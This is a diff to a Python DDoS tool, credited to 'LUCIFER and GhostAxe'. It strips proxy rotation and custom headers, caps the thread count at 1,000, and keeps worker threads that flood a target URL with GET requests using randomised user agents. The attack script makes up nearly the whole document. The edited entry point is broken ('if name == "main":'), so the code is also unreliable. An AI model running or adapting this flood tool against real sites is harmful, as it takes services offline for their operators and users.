@@ -5,6 +5,7 @@ import random
 import threading
 import sys
 import requests
+import time  # Import added here
 from requests.exceptions import RequestException, Timeout
 from queue import Queue
 from collections import defaultdict
@@ -23,13 +24,15 @@ Created by LUCIFER and GhostAxe - Enhanced for Advanced DDoS
 parser = argparse.ArgumentParser(description="Distributed HTTP attack tool for stress testing websites")
 parser.add_argument("target", help="Target URL or host")
 parser.add_argument("-p", "--port", default=80, type=int, help="Target port (default: 80)")
-parser.add_argument("-t", "--threads", default=100, type=int, help="Number of threads (default: 100)")
-parser.add_argument("-u", "--url", help="Target URL (use with -p for port)")
-parser.add_argument("--proxies", type=str, help="Path to proxy list (format: IP:PORT)")
-parser.add_argument("--headers", type=str, help="Custom headers in 'key:value' format, comma-separated")
+parser.add_argument("-t", "--threads", default=100, type=int, help="Number of threads (default: 100, max: 1000)")
 parser.add_argument("--https", action="store_true", help="Use HTTPS for requests")
 parser.set_defaults(https=False)
 args = parser.parse_args()
+
+# Limit threads
+if args.threads > 1000:
+    logging.warning("Too many threads requested. Limiting to 1000.")
+    args.threads = 1000
 
 logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
 
@@ -41,17 +44,6 @@ user_agents = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
 ]
 
-# Load Proxies
-proxies = []
-if args.proxies:
-    try:
-        with open(args.proxies, "r") as f:
-            proxies = [line.strip() for line in f if line.strip()]
-        logging.info(f"Loaded {len(proxies)} proxies from {args.proxies}")
-    except FileNotFoundError:
-        logging.error(f"Proxy file {args.proxies} not found. Exiting.")
-        sys.exit(1)
-
 # Request Statistics
 stats = defaultdict(int)
 stats_lock = threading.Lock()
@@ -61,17 +53,16 @@ def log_stats():
     while True:
         with stats_lock:
             logging.info(f"Success: {stats['success']} | Failed: {stats['failed']} | Timeout: {stats['timeout']}")
-        time.sleep(5)
+        time.sleep(5)  # Ensure 'time' is imported
 
-def send_request(url, headers=None, proxy=None):
+def send_request(url, headers=None):
     """
     Sends a single HTTP GET request.
     """
     headers = headers or {}
     headers["User-Agent"] = random.choice(user_agents)
     try:
-        proxy_dict = {"http": proxy, "https": proxy} if proxy else None
-        response = requests.get(url, headers=headers, proxies=proxy_dict, timeout=10)
+        response = requests.get(url, headers=headers, timeout=10)
         with stats_lock:
             if response.ok:
                 stats['success'] += 1
@@ -87,38 +78,25 @@ def send_request(url, headers=None, proxy=None):
             stats['failed'] += 1
         logging.warning(f"Error: {e}")
 
-def worker(target, headers, proxy_queue):
+def worker(target, headers):
     """
     Worker thread function to handle requests.
     """
     while True:
-        proxy = proxy_queue.get()
-        send_request(target, headers, proxy)
-        proxy_queue.put(proxy)  # Recycle proxy
+        send_request(target, headers)
 
-def attack(target, threads, proxies):
+def attack(target, threads):
     """
     Initiates the attack with the specified parameters.
     """
     logging.info("Starting DDoS attack...")
     headers = {}
-    if args.headers:
-        for header in args.headers.split(","):
-            try:
-                key, value = header.split(":")
-                headers[key.strip()] = value.strip()
-            except ValueError:
-                logging.warning(f"Invalid header format: {header}")
-
-    proxy_queue = Queue()
-    for proxy in proxies:
-        proxy_queue.put(proxy)
 
     threading.Thread(target=log_stats, daemon=True).start()
 
     for _ in range(threads):
-        threading.Thread(target=worker, args=(target, headers, proxy_queue)).start()
+        threading.Thread(target=worker, args=(target, headers)).start()
 
-if __name__ == "__main__":
-    target = args.url or f"http{'s' if args.https else ''}://{args.target}:{args.port}"
-    attack(target, args.threads, proxies)
+if name == "main":
+    target = f"http{'s' if args.https else ''}://{args.target}:{args.port}"
+    attack(target, args.threads)
